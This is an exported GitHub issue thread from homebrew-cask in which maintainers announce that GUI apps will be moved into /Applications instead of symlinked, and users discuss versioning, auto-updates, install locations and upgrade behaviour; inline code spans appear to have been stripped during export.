homebrew-cask/Homebrew/13201/100524296,13201,"Changes to homebrew-cask installation behaviour Depending on how long you’ve been following the development of homebrew-cask (henceforth HBC), you might’ve come across this great rant&lt;sup&gt;1&lt;/sup&gt;. It was the turning point in making the  stanza (precursor to ) a requirement to every cask. Prior to that, HBC tried hard to be smart about what to link, but we eventually concluded being smart doesn’t work — there are too many edge cases. The end of linking, and the beginning of moving (reasoning) We reached another such point with linking. What works for CLI apps does not work for GUI apps, and by sticking close to the homebrew model we’re bending apps to do what they’re not expecting, and only suffering from it. Issues we cannot fix continue to pop up, and copy as merely a preference or something to be done occasionally can’t solve them. We cannot, in addition to the inconsistency with s being installed instead of linked, add yet one extra inconsistency where even s won’t have a predictable behaviour. To put it bluntly, linking sucks for GUI apps. It doesn’t work and will never not be broken, as we can’t control what other developers do. Linking isn’t even needed, if you think about it. What separation of concerns are we worried about? CLI tools should have the separation homebrew provides because some of their apps (like newer versions of OS-level tools) provide critical features that could break the entire system if overridden. That is not the case at all with GUI apps; the only apps we have that could break the system on install (s) are already given free range. If you use HBC, there’s not even any reason to install a GUI app any other way, so why would that separation matter? GUI apps aren’t the only suffering from the current behaviour, even. Other artifacts suffer from similar issues and some even required the introduction of a different kind of linking. In addition, while having different versions of the same CLI app is many times desirable, that is a far from the norm with GUI apps. Having an  that works on every app, even ones that auto-update, also becomes nonsensical. We should emulate regular usage (i.e. what people do without HBC), instead of trying to perpetuate a new paradigm that is basically contradicting expectations. This, however, does not mean losing customisation options when it makes sense (like ). Every workaround we build is forcing apps to fit our model, and our model is bad. We’re building workaround on top of workaround, adding more code and work for something that will never work correctly. From The Cathedral and the Bazaar “you often don't really understand the problem until after the first time you implement a solution. The second time, maybe you know enough to do it right. So if you want to get it right, be ready to start over at least once”. As with other changes in the past, we now understand this problem a bit better and will adjust our solution accordingly. The end of linking, and the beginning of moving (technical) First steps towards new behaviour  Every artifact stanza except  will move its target to the appropriate location, instead of being sym/hardlinked. s will be moved to  by default. will continue to work, but rename the artifact itself instead of a link. The Caskroom ( by default) still needs to exist. Versioned subdirectories of the Caskroom won’t exist anymore, though.  Explanations  Explained in the reasonings above why most artifacts will be moved instead of linked. As for binaries being the exception, it’s simple not only is it expected, it’s advantageous, recommended, and sometimes necessary. Many times a  is linked from inside an app bundle and cannot simply be moved/copied from there and continue to work. In these cases, symlinking is the recommended (by the developer) course of action anyway, so we stay in line with the idea of emulating regular usage. It also makes it work similarly to other CLI tools, like installs from homebrew. Self-explanatory. It’s what most users expect, and would be our default anyway. Self-explanatory. It will be needed to keep a few things The originals from , when they’re standalone. Other things like uninstall scripts that come with some s.   Explained in the reasonings above. #### New stanzas/keys/flags to enhance these changes . Similarly to , it should be used when a value of  is needed. It means “the artifact this cask uses auto-updates, so even if the cask file updates, leave this alone when upgrading others”. This does not mean  in general is no longer a desirable feature — it is, but for casks who do not do it themselves. . Example . It means the artifact needs to be in a certain location to function correctly and as such will be moved there even if you have a different default location. . Takes no arguments and forcibly overrides .  Pseudo-code for , considering an  Doesn’t this mean a bunch of stuff might break? In the short term, yes, it does, but it is the right decision. We understand we have a bunch of users that are using homebrew-cask daily, and ideally we could try to make this a smooth transition like in the past. However, we’re admittedly pre-alpha and setting transition strategies is an inglorious job (everything will be discarded in the end, after all) that puts on hold even the smallest of changes indefinitely. It is incredibly time consuming, has variable results (we still get a bunch of issues pertaining to it), and (above all) kills momentum. Furthermore, this is a big change and there’s really no good way to make this seamlessly. In the end, we want to continue to move forward and improve HBC. Being afraid of changes in a pre-alpha would mean stagnation. Are there any other big changes planned? There are ideas, yes, but no exact plans yet. Those ideas still need to be discussed and most are concerned with the creation and maintenance of casks, not the usage of HBC.  &lt;sup&gt;1&lt;/sup&gt; If you haven’t, I highly recommend it as piece of HBC’s history. ",,False
homebrew-cask/Homebrew/13201/130349873,13201,"Seems like a useful change, and might be timely as well - I plan to do a clean install with 10.11, so breaking changes are not a huge issue. So does the  stanza remove the need for explicit versioned urls, or is there still a preference for versioned, shasum'd formulas? Would an example of a formula where  then be an app like Spotify, as it manages its own updates (ie, any forumas that use  &amp; ) ",,False
homebrew-cask/Homebrew/13201/130355914,13201,"Well, depending on how long the implementation (and release) takes. For now, preference should be left with versioned urls. The overlap of apps that auto-update and apps that have unversioned urls isn’t clear ( will make it so), so this is a discussion for later. The security provided by always having a version is desirable. This is incorrect. A cask having an unversioned url (i.e. it almost exclusively will use ) is not guaranteed to auto-update, or vice-versa. The two are completely unrelated. ",,False
homebrew-cask/Homebrew/13201/130356593,13201,"Is there a milestone, task list, thread, or wiki page where people can go check how much of this has been implemented and/or released? ",,False
homebrew-cask/Homebrew/13201/130357324,13201,"Not currently. Things should be released as issues as time goes on. It might actually take a few weeks for development of this to start, but this is the type of thing that should be announce early. ",,False
homebrew-cask/Homebrew/13201/130384234,13201,"plus one  Everything sounds good to me, I'm glad to hear we are moving forward in this direction for the most part. If apps come in a folder with a bunch of other things (readmes, licenses, plugin directories, etc.) will those be moved to  as well? What about if they are required to be in the same directory as the application? Should  casks be maintained from version to version? If an application downloads the latest update when necessary, but does not install it for the user, should it be considered ? I know that Filezilla does something like this (or it used to, I haven't checked recently). ",,False
homebrew-cask/Homebrew/13201/130387080,13201,"No. See point 4 of The end of linking, and the beginning of moving (technical) in the top post. Only what we already link will be moved, it’s one to one. Than we use  to move the directory. We’re already covered, there, and some casks were already changed, even. Yes, so anyone installing it for the first time gets the latest version. Many (most?) of these have discoverable appcasts, though, which makes the job easier. No. Only the ones that can do it seamlessly should, because otherwise we can still provide a better experience. ",,False
homebrew-cask/Homebrew/13201/130388886,13201,"(The following is my own preference.) I don't like folders in the Applications folder unless it really is to organize a bunch of apps (Microsoft Office). Suggestions for apps like Audacity and Eclipse that have a required folder structure  Place folder contents in , and place an app symlink in  Place folder contents in , and place an app symlink in  (bc sometimes apps have the same name) Place folder contents in , and place an app symlink in , and  (probably not a good idea bc hidden files)  Suggestions for apps with non-code supporting files  Place supporting files in  (more consistent with the above) Place supporting files in , , , etc. (more consistent with Mac expectation that trashing the app will pretty much uninstall it) Discard supporting files Leave supporting files in Caskroom  ",,False
homebrew-cask/Homebrew/13201/130390606,13201,"I like those ideas, @friend. However, I’ll also say “definitely not for now”, and the first paragraph of the top post explains why. Those could introduce issues we’re not foreseeing, and this change is in part meant to fix things, not introduce new possible points of failure. It doesn’t mean we can’t revisit those in the future, naturally, but for now the takeaway from this post should be emulate regular usage. Let’s nail that first, and only then see if being smart can pay off. ",,False
homebrew-cask/Homebrew/13201/130396370,13201,"Okay. I'm assuming that means the following  For apps that require a folder structure, move the entire folder to  or leave it in the Caskroom For apps that provide a  with some documentation, discard the documentation or leave it in Caskroom  ",,False
homebrew-cask/Homebrew/13201/130399973,13201,"Move it, using . Leave it in the caskroom. Both those points were addressed in the previous post. ",,False
homebrew-cask/Homebrew/13201/130508171,13201,"You reference  , currently all of my casks have defaulted to  . Is this change also changing that behavior of utilizing a folder local to the user's home directory? (sorry if this was covered elsewhere) ",,False
homebrew-cask/Homebrew/13201/130508809,13201,"Yes, it is changing that behavior. You will still be able to use  if you want by using by using the  flag. ",,False
homebrew-cask/Homebrew/13201/130526842,13201,Was there an open discussion of the pro's and con's of this somewhere that I've missed? ,,False
homebrew-cask/Homebrew/13201/130605724,13201,"@friend It was all covered in the top post. @friend’s explanation is correct. @friend Yes, there were multiple, including #3083 and #3888. I have a slight feeling from your last comment and this one you might be under the impression this might be a matter of user preference and voting. It’s not. This is about fixing a broken model, and I’ve spent many months thinking about this solution and managing homebrew-cask always with that in mind, to understand how it’d affect it. Keeping the old system is unsustainable. Every time there’s a new problem our workarounds fail to address we have to discuss how to implement a new one. Those are becoming harder and harder, and many of them are impossible to solve without breaking experience. All of them are solved immediately by emulating regular usage. As mentioned in the top paragraph of the top post, being smart failed, and as mentioned in a previous post, let’s first get things to work, and think about being smart later. ",,False
homebrew-cask/Homebrew/13201/130781732,13201,plus one i want this for years ,,False
homebrew-cask/Homebrew/13201/131088009,13201,"After just quickly scanning plus one on the .  Right now I just don't install apps that I know do automatic updating assuming it would break things.  Also the moving of apps I can see as a much needed change as I've had issues with some apps being linked which result in me again not using cask but installing it the ""Old Fashioned Way"". This big changes can be annoying in the short term but it's good to figure these things out while the project is still relatively new than wait 10 years and have to deal with everything breaking ",,False
homebrew-cask/Homebrew/13201/131682308,13201,"The most important benefit of linking in my opinion was that the old versions did not need to be replaced in that workflow, and thus the user could easily downgrade back to a previous version simply by changing the link (or just use the previous version directly to check some previous functionality). The ability to downgrade to a previous state is one of the most important benefits of a package manager in my opinion. Applications that depend on being installed at a hardcoded path are exhibiting bad behavior. There doesn't seem to be too many of them listed at #12858, and we shouldn't need to change the whole structure just to accommodate these. If we want to support the use of the upgrading options provided by the applications themselves, then (lacking a copy-on-write filesystem) we could have application versioning disabled by default while having a configuration property to enable it. Another issue I discovered with the linking was that the dock seems to resolve symlinks and store the original source path, which forces me to update the items manually. I hope this issue can be fixed in some way, but if not then I can live with it. If there are some other major issues with linking, then please elaborate. As for the  stanza, I am fine with it in general for applications that auto-update by default, but please have an option for ignoring it for those who do not want auto-updates. When using a package manager I like to manage my updates, and I disabled auto-updating and update prompts for all applications before discovering the lack of an  command in Homebrew Cask. ",,False
homebrew-cask/Homebrew/13201/131683817,13201,"There are actually numerous issues stemming from linking.  Many apps will prompt the user, if not installed in a standard location, to move it there. Many apps support in-app upgrading, which will result in an inconsistent experience when used in conjunction with brew cask upgrade. Many apps are already not versioned (latest) Having multiple versions of the same app causes issues with launching the app, i.e., file associations and apps that open other apps. If the app is identified by id, it's not clear which version of the app should be launched, and the arbitrary choice can be confusing for the user. If the app is identified by path, that identifier will break when old versions are uninstalled. This is an issue with not only Dock but basically most other launcher apps too. If you want a backup of an older version of the app, you probably don't expect to use both at the same time. The proper way to do this is probably to backup the install media (dmg/zip) instead of keeping the live app around. This file already exists in /Library/Caches/Homebrew!  ",,False
homebrew-cask/Homebrew/13201/131690443,13201,"@friend There is a  method to handle this issue. If I install an application from Homebrew Cask, I don't expect to use the in-app updater. I have disabled all these updaters in my applications. However, if we actually want to support this behaviour, then I have suggested using an option to disable versioning. Perhaps we can extract the version information from these in some other way? Otherwise, I guess we're forced to drop versioning in these cases as per the current behaviour. I don't see this issue with my Calibre associations, which I upgraded a few days ago. Files associated with it open the latest version. Although upon opening the ""Open With"" submenu it does list multiple versions. Again, it would be nice if there was some way to have it only look within , but I can live with it. Good point. However, there isn't a simple way to have Homebrew Cask reinstall a previous version short of manually editing the cask file. Also, this is how Homebrew mainline itself is implemented, and it would be best to keep conformity with it as far as possible. ",,False
homebrew-cask/Homebrew/13201/131690968,13201,"I'm on mobile but there's a comment somewhere about how they tried to be smart about installing, but realized that was an unmaintainable amount of overhead, and that the most sensible way to install is in the same way a normal, non-cask user would. Also, having a way to extract/install old install media would be a great idea (but probably for later, unless you want to make it!). From what I glean, cask uses Homebrew because it's good infrastructure, not because the user experience should be the same. It's probably better to keep conformity with the non-cask app experience. ",,False
homebrew-cask/Homebrew/13201/131699383,13201,"In that case I would like to know about these issues. The only issue mentioned in the original post here was of the hardcoded location expectation from a few applications. If we introduce a generic downgrade feature, then users would probably expect it to be able to work across versions which weren't installed before as well, but that is problematic to implement in the Homebrew/Cask Git structure, where updates to version and installation instructions are not kept separate. I guess we could implement a ""revert"" feature that only reverts to versions already present in the cache, and reinstall it using the cask instructions at the revision at which it was originally installed. If this is actually implemented or planned for implementation, then I withdraw my objections to removing the linking structure. I am not familiar with Ruby programming, so I would probably not be able to implement this feature myself. The FAQ on this very issue suggests the opposite ",,False
homebrew-cask/Homebrew/13201/131701959,13201,"Also, this is a somewhat separate issue, but I always thought it strange that it seems like Homebrew Cask uses a hardcoded global path () to store the Casks regardless of the actual location of Homebrew itself, so even a local Homebrew installation would create global Casks (I haven't tested this myself, but this is my assumption lacking documentation to the contrary). It would probably have been best for it to use some location inside the Homebrew installation itself (unless explicitly configured otherwise), or at any rate not use a global location if Homebrew itself is not in one. The default value for the  option could probably also have been inferred from this. ",,False
homebrew-cask/Homebrew/13201/131840282,13201,"The reason we're moving away from linking and towards copying/moving instead is also due to an inherent difference in the nature of OS X apps and binary/CLI tools.  Within a Linux/Unix/BSD environment, it is commonplace to link binaries into  directories. Binaries are built against libraries, which reside in a preset location (, , etc.). App bundles are somewhat self-contained. Sometimes, they also contain config/preference data (although that is a bad idea, IMO)   It is not uncommon to use multiple versions of some CLI tools, especially if there are breaking/compatibility changes. A CLI tool will almost never update itself. There are a few newer ones, particularly package managers themselves, that can also update themselves (e.g. , ) - in fact, self-upgrading CLI tools often break things for Homebrew - a red flag that perhaps we shouldn't handle app bundles, many of which have some sort of update functionaly or contain persist data within the bundle, the same way Homebrew handles CLI tools. Different versions of CLI tools will often be named differently from other versions, especially when managed by Homebrew (e.g.  vs ). Some app bundles also follow this type of a scheme, in terms of adopting a new name with a new major release.    Some apps will throw dialogs to move to , like you said, but there are some that will simply refuse to run. This could get very messy. It's why Homebrew dropped the feature ( has been deprecated in favor of ). I think it wouldn't be as big of an issue with casks, simply because building software is a more fragile process than downloading/installing app bundles. Nevertheless, it's still a headache to implement at this point, and if we ever add it, it would be much later in the roadmap for this project. In the past, we've tried to keep with consistent user experience with Homebrew. However, we've found that it simply doesn't work as well as we want to, because OS X apps just can't be handled the same way as CLI binaries. Imagine using an apple peeler to peel an orange - it doesn't get the job done (unless you wanted orange zest in the first place). Thus, we're willing to compromise a bit on UX conformity with Homebrew in order to make the system more functional and less buggy overall. This has yet to be updated. ",,False
homebrew-cask/Homebrew/13201/131932850,13201,"@friend I’m on a phone (won’t have access to a computer for the next week), so forgive any bluntness. @friend and @friend addressed your points, but I’d like to add something quick. As I’ve mentioned in the top post, we’re not like other package managers. Any point you justify with “I expect that of other package managers” is irrelevant we tried those, and they failed. Following a pattern that breaks for us simply because others do so is nonsensical. Furthermore, all your solutions are nothing more than more workarounds, which is exactly the problem, as mentioned in the top post, so they don’t solve anything. Lastly, you link to an issue that has few examples, and ask for more cases. I want to be perfectly clear that I see you were perfectly cordial when making your case and I appreciate that and want to be just as polite when I say your points are mostly due to lack of context and experience with HBC. Those few examples are part of a list still being made, and part of a much larger issue. We’re also not going to link to every specific issue that lead to every specific reasoning — the top post is verbose as it is. I’ll say again this is not a vote. We tried other solutions before, and this new course was decided after years of dealing with HBC and seeig what works and doesn’t. Discussion is encouraged and appreciated, and we will give context for the reasonings, but if you want specific examples, those would take a while to search for just to get them to you simply to justify in detail what we already know and explained in broad strokes. That would be very time consuming and frankly useless, so if you want specifics, you’ll have to do the searching. I hope you understand we can’t be doing that for every user, or we’d do nothing else. We will explain reasonings and link to the appropriate contexts, but if conclusions have been reached through experience with many separate issues throughout the years, you can’t reasonably expect any of us to drop everything and do your reasearch to satisfy your doubts, when you just got here, and every issue is public and searchable. We’re trying to make the project better, and this decision is just one more towards that goal. It’s a conclusion arrived at from being here everyday seeing things break and work, and striving for less of the former and more of the latter. ",,False
homebrew-cask/Homebrew/13201/132082986,13201,"@friend Thanks for explaining the structural differences between OS X GUI apps and CLI tools. You describe three differences  Binaries are built against libraries, while app bundles are self-contained. Sometimes, app bundles store configuration data inside themselves. App bundles provide self-updating functionalities.  The first difference does not seem to be relevant to versioning. As you mention, keeping configuration data inside app bundles seems to be a bad practice, and would get overwritten by Homebrew Cask upgrades in the new schema as well. The self-updating issue seems to be the relevant issue here. These don't seem to be problematic for the most part, but they do mess up the versioning. As I have mentioned before, we can have versioning as an optional feature for those who don't want to use the application updaters. ",,False
homebrew-cask/Homebrew/13201/132083014,13201,"@friend I acknowledge that I am not aware of the full context. I merely noted that there didn't seem to be too many examples compiled of the main issue that you noted in your original post. If you assert that there are a significant number of applications that break if not located at a hardcoded path, then I'll take your word for it. I think that when making such a large structural change, the reasoning for it should be documented as comprehensively as possible. You may have had lots of isolated discussions on this issue at various points, but there is some point to bringing these together (not necessarily in this issue) so that everyone (not just the maintainers and people associated with the project from the start) can see the full context. There might be alternative solutions or enhancements provided as a result of a comprehensive discussion on this. I did look through some old issues on this subject that were linked from the discussion on the upgrade feature before commenting here, but you yourself took the opposite stance on those. I can try looking further, but I can never be sure that my research is comprehensive without some official compilation to cross-reference. I didn't present any solution yet, other than keeping the status quo as an option. PS Sorry to disturb your vacation wink Please feel free to not respond until you return. ",,False
homebrew-cask/Homebrew/13201/132153026,13201,"Here’s the thing there were discussions. This issue is discussed and settled. If we restart the discussion everytime someone who wasn’t there asks to have the conversation again, we’ll never do anything. That is a good sign, I hope, I did really think hard about this. Thank you. Going well so far. A good day to you. ",,False
homebrew-cask/Homebrew/13201/132212793,13201,"But it is! This often means that app bundles are built against old or outdated libraries, where as the dependencies of CLI tools can be updated without having to update the actual tool itself. App bundles also sometimes stick their stuff in weird places while CLI tools are pretty standard with their behavior - I've found that some non-native apps are the worst offenders, placing items in random folders that I would never think to check. It's not so much an issue with versioning directly, but rather unnecessary overhead if a maintainer has to keep up with all of the files in order to stage the upgrade process via , especially some of these apps offer somewhat reliable systems for upgrading themselves. You're right about that. Perhaps some sort of app bundle ""snapshots"" could assist in identifying config/persistent data within the bundles take snapshot of bundle right after install, and take snapshot of bundle right before upgrade, and then perform the upgrade and re-apply the changes from between the snapshots. I have no idea how effective that would be, nor how much code we would have to write. Regardless of how you look at it, this project has been practically stagnant for the past few months up to now in terms of core development, and the original direction we were moving in was simply a huge ball of workarounds that somehow worked. But it has become pretty clear that the approach we've used in the past isn't ""cost-effective"" to maintainers, nor is it the best for end-users either. There were too many corner cases to accomodate for, and so rewriting the core to handle corner case apps more elegantly is a priority right now. I'm sorry I couldn't find any more old issues that are relevant to this discussion, as you've asked for, but here's one last megalist of everything that's been referred to in this issue so far, for your reference - I imagine they might have gotten lost in the shuffle. They cover the default installation process, default installation location, etc. - many decisions/discussions that are the basis of the decision in the recent changes. There's a lot of back and forth discussion on pretty much every decision that has had been made in the past, so you may find that somebody else can explain the rationale for a decision much better than I can.  #12746  #12076 #3888 #8210 #9178 #12517 #10115 #4651 #4359 #13230 #13256  #10039  ",,False
homebrew-cask/Homebrew/13201/133156163,13201,"I wholeheartedly welcome this change. From a user's perspective I've had to deal with explicit or subtle breakage due to linking on multiple occasions, and I have a personal installer script that swaps some applications into  (browsers, Tunnelblick, etc.). I add to the script every time I'm bitten, and the script is growing. Not fun. @friend Please don't just talk from your experience. ""I don't have problems so you shouldn't make changes"" isn't a good attitude. I apologize for exaggerating; I know you were asking about what exactly the problems are. However, if you allow me to talk from my experience, I'll tell you that problems abound. And I'm not even a maintainer, who oversees all the headaches. Please excuse me, but I think this sentence along sets you apart from normal users. I call that paranoid. Homebrew doesn't even support upgrade at the moment (and not any time soon, as far as I know), I just can't picture how you do your upgrades. At any rate, you're not the norm, unless I'm completely carried away by my own workflows. ",,False
homebrew-cask/Homebrew/13201/133156170,13201,"I would like to add to the thread by pointing out that not only some app bundles need to live in a certain location in order to work. There are other nonstandard artifacts, like Mail plugins, that won't work if linked; and as OS X tightens up its security across releases, we should expect to see more of those (or maybe the hackish things would stop working altogether, who knows). Example the QuoteFix Mail plugin. Last time I fixed it I had to use an ugly  + copy in  hack to make it work. Should we also have an issue (similar to #12858) to track those nonstandard casks that should benefit greatly from plans in this issue? ",,False
homebrew-cask/Homebrew/13201/133163640,13201,@friend would you mind sharing your script that describes some of the workarounds needed for non working linked apps ? I'm currently refactoring my provisioning setup to use homebrew casks but I'm not sure that was a good idea with what I'm reading here... ,,False
homebrew-cask/Homebrew/13201/133164278,13201,"What I currently use  It doesn't solve every problem though, just things I would do on a clean install. And it would break uninstalling to some extent, but hopefully you wouldn't need to uninstall those critical apps. ",,False
homebrew-cask/Homebrew/13201/133187547,13201,"Comment in the issue instead, and I’ll add to and adapt the main post when I have the chance. ",,False
homebrew-cask/Homebrew/13201/135755465,13201,"so, for us that already have N applications installed through cask, how will the upgrade and relocation happen? Will Cask automatically move the apps there after some  in the future? Will i have to remove all and reinstall for it to automatically happen? will there be any command to make this happen? Also, for those of us with  already on their shell profile, will this conflict in any way with the new mode?  should i remove it ? ",,False
homebrew-cask/Homebrew/13201/135757333,13201,"@friend All those questions are answered in the top post. There will be no automatic transition for the new system, and there will be no conflict by having that line in your shell profile. ",,False
homebrew-cask/Homebrew/13201/138109474,13201,"hi all, just learning about this great project today would it may be wise to wait for this update to be done ? or doesn't it really matter ? ",,False
homebrew-cask/Homebrew/13201/138109554,13201,"@friend We have no time-frame set for completion, so it’s really up to you. ",,False
homebrew-cask/Homebrew/13201/141668345,13201,"This change to moving apps is fantastic news. I avoided using casks because I never liked the linking behavior and inconsistency of having a mix of apps and links in my /Applications. And superficially because I hated seeing icons in Applications with the symlink symbol ). Can't wait for this change, will start using casks as soon as it happens. Thanks! ",,False
homebrew-cask/Homebrew/13201/142046062,13201,"I have concerns with the behavior of . As the owner of my machine, I should have final say in where applications are installed; not the formula author. There is clearly potential conflict between  and . As the pseudo-code above does, it is helpful to print a warning when those values are in conflict. However, final say ought to be determined by the machine owner, not the author of the formulas (who may be errant, if well-intentioned). I would propose that if  conflicts with , a warning message still be emitted as suggested here. But  should be the respected value, not . The user then becomes responsible for any issues with installation. The following scenarios are possible  formula indicates  but does not, in fact, actually need to be in said location (be it benign ignorance or accidental configuration, or anything really) formula indicates  but app actually functions just fine in a specific  (known by the user) formula indicates  for certain uses of the app, but user does not need said uses, and app works fine for given subset of uses from  formula indicates  but user is attempting to determine if app actually functions in  anyway  ",,False
homebrew-cask/Homebrew/13201/142047896,13201,"@friend I think  should be respected over  by default, but we could provide a  flag that overrides this decision. I envision lots of bug reports about faulty installations otherwise. ",,False
homebrew-cask/Homebrew/13201/142048877,13201,"I can definitely see that. The biggest thing, I think, is that users should have final say somehow. If that's with Yet Another Flag™, so be it. As long as it's possible for the user to override the formula author, I'm happy. ",,False
homebrew-cask/Homebrew/13201/142142620,13201,Added  to the top post. ,,False
homebrew-cask/Homebrew/13201/142326558,13201,"I'm curious, what would happen if I was to submit an application that is called ""Mail"" or ""Pages"", etc. would brew-cask overwrite the existing App? How does it decide whether an App is pre-existing or not? Does it even do that or do you completely rely on peer-review? ",,False
homebrew-cask/Homebrew/13201/142327183,13201,"The logic course of action there is to not overwrite what already exists, and print an error. ",,False
homebrew-cask/Homebrew/13201/142333700,13201,then how do upgrades work? At some point you have to overwrite an existing path ,,False
homebrew-cask/Homebrew/13201/142342686,13201,"To upgrade, you must install first. This is why they are different verbs. When you install, it can be assumed nothing with the same name exists — if it does, we know something is wrong, and should abort. However, when you upgrade, if something exists with the same name it is expected, and we can proceed. Furthermore, we should always  and never , so none of these are irreversible. ",,False
homebrew-cask/Homebrew/13201/142351840,13201,"Well, I think there should be an option to remove the trashed files after a successful upgrade. Many of us have good back up policies, and we'll be clearing out the trashes anyway. In my opinion homebrew-cask should automate things as much as possible. ",,False
homebrew-cask/Homebrew/13201/142353345,13201,"I’d wager most don’t. What’s the problem then? No harm done. The difference there is you’re the one cleaning out the trash, not us. It should. Above that, however, it shouldn’t screw up your setup. In all, a few MBs for an updated app in the trash is way better than the hassle of losing an important app or having to go get your backup. Also, if I recall correctly, this is what apps that auto-update themselves do, so that even goes in line with the new concept of emulating regular usage. ",,False
homebrew-cask/Homebrew/13201/142360629,13201,Yes it is. Okay it makes sense. ,,False
homebrew-cask/Homebrew/13201/142396400,13201,"Trashing sounds fine. It's the same as what MacUpdate does. MacUpdate is a good model generally - it does not ever try to update system apps such as Mail.app, and any updated apps send the old version to the Trash. ",,False
homebrew-cask/Homebrew/13201/142668819,13201,Should we think about seeing if Homebrew Cask could use a command-line interface to run application auto-updaters for casks whose  stanza is set to true if such a CLI is provided by said auto-updater?  And should we ask more auto-updating applications to provide CLIs to their auto-updaters? ,,False
homebrew-cask/Homebrew/13201/142672231,13201,"No. Not anywhere in the near future, at least. ",,False
homebrew-cask/Homebrew/13201/143013809,13201,"@friend  Guess I'll put that on the wishlist, then — where is that, by the way, or would I just mention my feature request in 'Issue #13969  Add auto_updates stanza for Casks'? ",,False
homebrew-cask/Homebrew/13201/143050459,13201,"@friend There isn’t any. To be clear, what I mean by that is that it is out of the question for now. You can mention that again a few months after this installation behaviour is implemented and we actually see how it worked in the wild, but to be honest I don’t see that feature ever happening. For one, it’s two much work for little to no gain. We’d need to support each application individually and it’d be mostly useless if the application can auto update itself, let it, that is the whole point. Furthermore, asking developers to support CLI ways of updating their GUI apps is a losing proposition I bet it is not going to happen. Not in any meaningful number. ",,False
homebrew-cask/Homebrew/13201/143476609,13201,"@friend  Ah, I see.  Such a feature would be convenient, though…sigh. ",,False
homebrew-cask/Homebrew/13201/144619454,13201,"As someone who does expect in-app auto-update to work (and hasn't gone around disabling it), I'm really looking forward to this change. Over half a dozen apps installed via HBC exist not only in  as symlinks, but also in my  folder. Likely due to auto-updates deciding that's where they belong. It's a mess, and then there are bizarre errors like this &lt;img width=""663"" alt=""tower-linking"" src="" a user experience perspective, I think it's very important to arrange applications the way the regular installers do, making  and in-app upgrades interchangeable. In the following screenshot, a Lightrooom 6 upgrade left me with ""Lightroom 5"" (must confirm whether their installer renamed it, but I believe so). &lt;img width=""854"" alt=""lightroom5"" src="" for concerns of overwriting Mail.app, HBC couldn't do so if it tried, at least as of El Capitan. System Integrity Protection protects the Apple apps listed in . (Of course, not overwriting apps managed by the App Store could still be a valid concern). One final remark. Could we please update the README to use more precise wording (""in the future""). I misread it ""as of 12/Aug/2015, Homebrew-cask will..."" And then I was sad that it wasn't the case. ",,False
homebrew-cask/Homebrew/13201/144620877,13201,"I believe @friend was looking for some evidence of the issues this change will help resolve. Here's another one. I only have one copy of Things installed, but Things is confused because there is a symlink in  and the actual copy in . I don't want to know what happens if I click Delete  ""Extra"" Copy. &lt;img width=""504"" alt=""things"" src=""",,False
homebrew-cask/Homebrew/13201/145466358,13201,So when will this change happen? ,,False
homebrew-cask/Homebrew/13201/145511627,13201,"When it’s done. There’s really no other answer, there. ",,False
homebrew-cask/Homebrew/13201/145890070,13201,"I'm happy to see this change is finally happening, I've been using cask for a long time but the application management has always bothered me. Good work on this proposal/documentation of how it's going to be implemented, exactly what I've been hoping for! plus one ",,False
homebrew-cask/Homebrew/13201/145981721,13201,I'm interested in how this is going to work in a situation where a user has already installed an app from the Mac App Store. Will an overwrite prompt be given? ,,False
homebrew-cask/Homebrew/13201/145983612,13201,"@friend I believe that was addressed in the previous comments. Since the app was not installed beforehand, and the file exists, a warning/error will be given and no overwriting will take place. ",,False
homebrew-cask/Homebrew/13201/145985528,13201,"Actually, I just tested out Skitch. There was no prompt at all. Brewfile using ",,False
homebrew-cask/Homebrew/13201/145989429,13201,Was able to reproduce with several App Store/free apps. Evernote Alfred etc. ,,False
homebrew-cask/Homebrew/13201/145989776,13201,"@friend There is no prompt. This is what happens if you already have an app installed No failure is reported because nothing failed. The cask was downloaded, unpacked, and staged. We won't remove an existing non-cask installation. ",,False
homebrew-cask/Homebrew/13201/145990120,13201,"I'm telling you it's happening on my system. Clean install of El Capitan. I'm running , btw. Maybe that's the difference. ",,False
homebrew-cask/Homebrew/13201/145990870,13201,"is an external plugin, and not officially supported by . I can't speak for what it does or doesn't do. Have you double-checked your  to make sure that it is, indeed, a symlink to the Cask installation? If not, then everything is working as intended. ",,False
homebrew-cask/Homebrew/13201/145991326,13201,"In any case, what you are reporting would be a bug with the existing behavior of . If you determine that we are, in fact, overwriting app bundles with symlinks, please open a separate issue. ",,False
homebrew-cask/Homebrew/13201/145991671,13201,"@friend Help my understand why  is an external plugin, if it's maintained by the  org on GitHub.  cc @friend In any event, what's the recommended way to batch install multiple casks? ",,False
homebrew-cask/Homebrew/13201/145992461,13201,@friend See  for issues with homebrew-bundle ,,False
homebrew-cask/Homebrew/13201/145994694,13201,"@friend We are not Homebrew. Homebrew and Homebrew-cask are maintained by completely separate teams. Therefore,  is external to us. If you want to install multiple casks, a simple shell script would suffice Or perhaps Or even ",,False
homebrew-cask/Homebrew/13201/146083458,13201,Why is it that after I  that my GitHub Desktop.app shows in my  folder as a symlinked app but shows in launchpad as an app that isn't symlinked? ,,False
homebrew-cask/Homebrew/13201/146098222,13201,@friend Oh launchpad don't mind whether it is a symlink or a directory. ,,False
homebrew-cask/Homebrew/13201/146100219,13201,Then can I take that directory from launchpad and apply that to my  folder? ,,False
homebrew-cask/Homebrew/13201/146143424,13201,"@friend Your problem has nothing to do with this issue. Lets please stay on-topic, it is big enough as it is. Either way, it’ll be irrelevant once this is up, so we won’t work on it. Furthermore, your last post is an OS X question, not a homebrew-cask question, so you should resort to a website with that specialty, like Ask Different from Stack Exchange. ",,False
homebrew-cask/Homebrew/13201/146145297,13201,"@friend I recommend you post one more comment that sort of acts as an FAQ and then lock this thread. I think the FAQ should include answers to the following questions (my best-guess answers are in parens)  What is this thread about? (HBC will be changing the way it works, and this is an announcement) Are these changes in effect yet? (No) When will these changes be in effect? (Not sure, but not now) Is there a timeline for that? (No) Why not? (Because this project is run by volunteers) How can people help out? (By contributing code) What if someone has a question regarding this issue? (1. Check that it's actually related to this issue 2. Check that the answer isn't in this thread 3. If neither, open a new issue)  ",,False
homebrew-cask/Homebrew/13201/146187043,13201,"@friend I like that, thank you. Nothing further to add to your FAQ, so we can leave it as is. I didn’t want to close this at the start because I wanted people to find holes in it, but it seems like the idea as it stands is pretty solid and agreed upon, so yes, lets stop diverging further since comments have been becoming less relevant. ",,False
homebrew-cask/Homebrew/13201/220445423,13201,"The first and most important part of this change is now very close to being implemented. If you’re interested in helping test it, head over to  and follow the instructions at the bottom. ",,False
homebrew-cask/Homebrew/13201/222757478,13201,"Getting really close, now, so if you had some things you wanted to do that are dependent on this change, now is the time. ",,False
